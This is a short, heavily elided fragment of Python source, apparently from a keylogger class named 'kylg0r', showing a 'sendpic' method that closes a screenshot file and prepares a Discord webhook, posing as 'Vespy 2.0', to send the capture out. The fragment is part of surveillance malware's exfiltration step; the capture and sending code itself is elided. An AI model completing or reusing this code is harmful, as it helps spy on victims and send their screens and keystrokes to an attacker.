...
class kylg0r:
        ...
        def sendpic(self):
            ...
            screeny.close()
            webhook = DiscordWebhook(url=self.wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1109262870883090465/1113545572192899072/forvespyservero.png")
